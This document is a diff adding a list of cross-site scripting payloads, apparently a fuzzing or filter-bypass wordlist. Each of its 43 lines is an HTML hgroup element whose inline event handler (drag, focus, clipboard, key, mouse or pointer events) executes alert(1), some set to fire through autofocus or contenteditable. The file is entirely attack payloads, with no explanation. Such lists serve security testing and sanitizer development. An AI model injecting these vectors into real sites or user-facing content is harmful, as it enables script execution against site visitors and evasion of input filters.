@@ -1,0 +1,43 @@
+<hgroup draggable="true" ondrag="alert(1)">test</hgroup>
+<hgroup draggable="true" ondragend="alert(1)">test</hgroup>
+<hgroup draggable="true" ondragenter="alert(1)">test</hgroup>
+<hgroup draggable="true" ondragleave="alert(1)">test</hgroup>
+<hgroup draggable="true" ondragstart="alert(1)">test</hgroup>
+<hgroup id=x tabindex=1 onactivate=alert(1)></hgroup>
+<hgroup id=x tabindex=1 onbeforeactivate=alert(1)></hgroup>
+<hgroup id=x tabindex=1 onbeforedeactivate=alert(1)></hgroup><input autofocus>
+<hgroup id=x tabindex=1 ondeactivate=alert(1)></hgroup><input id=y autofocus>
+<hgroup id=x tabindex=1 onfocus=alert(1)></hgroup>
+<hgroup id=x tabindex=1 onfocusin=alert(1)></hgroup>
+<hgroup onafterscriptexecute=alert(1)><script>1</script>
+<hgroup onbeforecopy="alert(1)" contenteditable>test</hgroup>
+<hgroup onbeforecut="alert(1)" contenteditable>test</hgroup>
+<hgroup onbeforepaste="alert(1)" contenteditable>test</hgroup>
+<hgroup onbeforescriptexecute=alert(1)><script>1</script>
+<hgroup onblur=alert(1) tabindex=1 id=x></hgroup><input autofocus>
+<hgroup onclick="alert(1)">test</hgroup>
+<hgroup oncontextmenu="alert(1)">test</hgroup>
+<hgroup oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<hgroup oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<hgroup ondblclick="alert(1)" autofocus tabindex=1>test</hgroup>
+<hgroup onfocusout=alert(1) tabindex=1 id=x></hgroup><input autofocus>
+<hgroup onkeydown="alert(1)" contenteditable>test</hgroup>
+<hgroup onkeypress="alert(1)" contenteditable>test</hgroup>
+<hgroup onkeyup="alert(1)" contenteditable>test</hgroup>
+<hgroup onmousedown="alert(1)">test</hgroup>
+<hgroup onmouseenter="alert(1)">test</hgroup>
+<hgroup onmouseleave="alert(1)">test</hgroup>
+<hgroup onmousemove="alert(1)">test</hgroup>
+<hgroup onmouseout="alert(1)">test</hgroup>
+<hgroup onmouseover="alert(1)">test</hgroup>
+<hgroup onmouseup="alert(1)">test</hgroup>
+<hgroup onmousewheel=alert(1)>requires scrolling
+<hgroup onpaste="alert(1)" contenteditable>test</hgroup>
+<hgroup onpointerdown=alert(1)>XSS</hgroup>
+<hgroup onpointerenter=alert(1)>XSS</hgroup>
+<hgroup onpointerleave=alert(1)>XSS</hgroup>
+<hgroup onpointermove=alert(1)>XSS</hgroup>
+<hgroup onpointerout=alert(1)>XSS</hgroup>
+<hgroup onpointerover=alert(1)>XSS</hgroup>
+<hgroup onpointerrawupdate=alert(1)>XSS</hgroup>
+<hgroup onpointerup=alert(1)>XSS</hgroup>
